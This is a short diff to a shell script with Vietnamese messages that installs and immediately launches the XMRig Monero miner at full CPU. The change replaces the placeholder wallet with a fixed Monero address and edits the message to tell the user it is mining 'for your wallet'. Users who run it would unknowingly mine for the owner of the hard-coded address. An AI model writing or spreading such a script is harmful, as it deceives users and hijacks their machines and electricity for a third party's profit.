@@ -22,13 +22,13 @@ cd ~
 cat > ~/xmrig/start.sh << 'EOF'
 #!/bin/bash
 cd ~/xmrig/build
-./xmrig -o pool.supportxmr.com:3333 -u 89s2nBxxYourXMRWalletHerez4rkG1234567890abcdef -k --coin monero --cpu-priority=5
+./xmrig -o pool.supportxmr.com:3333 -u 47jKLNTu7MHZzbyfnhEZV4PHXe7z8CzpU6WV6hukLPthYnzmtXRWDFUYaa3pdM9xMnQxwsHCnw1zXBkVaNeUGRVkUc7VXoL -k --coin monero --cpu-priority=5
 EOF
 
 chmod +x ~/xmrig/start.sh
 
 # Chạy luôn!
 echo ""
-echo "🚀 Cài xong! Đang bắt đầu đào với full CPU..."
+echo "🚀 Cài xong! Đang bắt đầu đào với full CPU cho ví của bạn..."
 sleep 2
 ~/xmrig/start.sh
